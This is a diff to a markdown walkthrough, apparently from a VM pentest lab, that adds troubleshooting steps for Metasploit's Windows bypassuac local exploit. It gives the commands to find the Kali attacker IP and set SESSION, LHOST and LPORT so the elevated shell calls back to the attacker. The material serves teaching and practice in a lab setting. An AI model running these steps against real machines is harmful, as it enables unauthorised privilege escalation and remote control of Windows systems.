@@ -138,6 +138,25 @@ privilege escalation by bypassing the UAC. And after setting up everything, we w
 ```
 set session 1 
 ```
+### The bypassuac module starts its own handler and defaults LHOST to 127.0.0.1 if not specified. You must explicitly set LHOST to your Kali IP (the real attacker IP).
+🔧 Step-by-Step Fix:
+
+    1. Identify your Kali Linux IP (the one reachable by the Windows VM):
+    
+    ip a
+  #### Example: 192.168.56.102  (likely same as your original handler)
+    2. In the bypassuac module, set both SESSION and LHOST:
+   ```
+    use exploit/windows/local/bypassuac
+
+set session 1
+set LHOST 192.168.56.102    # ← YOUR KALI IP, NOT 127.0.0.1
+set LPORT 4445              # ← Use a NEW port to avoid conflict
+````
+exploit
+
+
+    
 **Command**:
 ```
 exploit
